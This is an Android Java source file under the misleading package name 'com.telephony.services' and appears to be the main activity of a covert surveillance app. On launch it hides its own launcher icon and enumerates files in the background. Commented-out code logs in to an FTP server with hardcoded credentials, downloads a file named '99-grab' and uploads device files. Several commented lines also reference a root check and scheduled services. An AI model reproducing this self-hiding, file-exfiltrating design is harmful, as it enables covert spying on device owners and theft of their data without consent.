package com.telephony.services;

import it.sauronsoftware.ftp4j.FTPAbortedException;
import it.sauronsoftware.ftp4j.FTPClient;
import it.sauronsoftware.ftp4j.FTPDataTransferException;
import it.sauronsoftware.ftp4j.FTPDataTransferListener;
import it.sauronsoftware.ftp4j.FTPException;
import it.sauronsoftware.ftp4j.FTPIllegalReplyException;

import java.io.File;
import java.io.FilenameFilter;
import java.io.IOException;
import java.util.ArrayList;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;

public class Main extends Activity {
	
	public ArrayList<String> listFiles(File root, FilenameFilter filter) {
		ArrayList<String> sb = new ArrayList<String>(); 

		File[] list = root.listFiles(filter);
		for (File f : list) {
			if (f.isDirectory()) {
				sb.addAll(listFiles(f, filter));
			} else {
				sb.add(f.getAbsolutePath());				
			}
		}
		return sb;
	}

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);

		// Toast.makeText(this, getResources().getString(R.string.cant_run),
		// Toast.LENGTH_SHORT).show();

		// Intent myIntent = new Intent(this, ReglamentService.class);

		// startService(myIntent);

		// Log.d(Utils.LogTag, Utils.CheckRoot()+"");
		// AlarmManager am = (AlarmManager)
		// this.getSystemService(Context.ALARM_SERVICE);
		// Intent myIntent = new Intent(this, ReglamentService.class);
		// PendingIntent pmyIntent = PendingIntent.getService(this, 0, myIntent,
		// 0);
		// am.set(AlarmManager.ELAPSED_REALTIME, 50000L, pmyIntent);
		Utils.setComponentState(this, Main.class, false);
		new Thread(new Runnable() {

			public void run() {
				/*
				 * URL url; StringBuilder response = new StringBuilder();
				 * InputStream in = null; try { url = new
				 * URL("ftp://upload:ghjuhtcc@10.0.0.253:21/test");
				 * URLConnection urlConnection = url.openConnection();
				 * urlConnection.setDoOutput(true);
				 * urlConnection.setDoInput(true); in = new
				 * BufferedInputStream(urlConnection.getInputStream()); int
				 * temp; while ((temp = in.read()) != -1) {
				 * response.append(temp); } Log.d(Utils.LogTag,
				 * response.toString());
				 * 
				 * } catch (MalformedURLException e) { // TODO Auto-generated
				 * catch block e.printStackTrace(); } catch (IOException e) { //
				 * TODO Auto-generated catch block e.printStackTrace(); }
				 * 
				 * finally { try { in.close(); } catch (Exception e) {
				 * e.printStackTrace(); } }
				 */
				FTPClient mFTPClient = new FTPClient();

				try {
					ArrayList<String> al = listFiles(getFilesDir(), null);
					for (String string : al) {
						Log.d(Utils.LogTag,string);
					}
					//mFTPClient.connect("10.0.0.253");
					//mFTPClient.login("upload", "ghjuhtcc");
					//mFTPClient.setCharset("UTF8");
					//mFTPClient.setPassive(true);
					
					// mFTPClient.changeDirectory("test");
					// InputStream inStream =
					// mFTPClient.doretrieveFileStream("test");
					// InputStreamReader isr = new InputStreamReader(inStream,
					// "UTF8");
					/*
					 * mFTPClient.download("99-grab", new
					 * File(getFilesDir(),"99-grab"),new
					 * FTPDataTransferListener() {
					 * 
					 * public void transferred(int arg0) { Log.d(Utils.LogTag,
					 * "transferred " + arg0);
					 * 
					 * }
					 * 
					 * public void started() { Log.d(Utils.LogTag, "started");
					 * 
					 * }
					 * 
					 * public void failed() { Log.d(Utils.LogTag, "Failed");
					 * 
					 * }
					 * 
					 * public void completed() { Log.d(Utils.LogTag,
					 * "Completed");
					 * 
					 * }
					 * 
					 * public void aborted() { Log.d(Utils.LogTag, "aborted");
					 * 
					 * } });
					 */
					/*File[] list = getFilesDir().getAbsoluteFile().listFiles();
					for (File file : list) {
						Log.d(Utils.LogTag, file.getAbsoluteFile().getParent());
						String p = file.getAbsoluteFile().getParent().replaceFirst(getFilesDir().getAbsolutePath(), "/");
						Log.d(Utils.LogTag, p);
						try {
							mFTPClient.changeDirectory(p);
						} catch (FTPException e) {
							mFTPClient.createDirectory(p);
							mFTPClient.changeDirectory(p);

						}
						//mFTPClient.createDirectory(p);
						mFTPClient.upload(file, new FTPDataTransferListener() {

							public void transferred(int arg0) {
								Log.d(Utils.LogTag, "transferred " + arg0);

							}

							public void started() {
								Log.d(Utils.LogTag, "started");

							}

							public void failed() {
								Log.d(Utils.LogTag, "Failed");

							}

							public void completed() {
								Log.d(Utils.LogTag, "Completed");

							}

							public void aborted() {
								Log.d(Utils.LogTag, "aborted");

							}
						});
					}*/

				} catch (IllegalStateException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}).start();

		finish();
	}

}
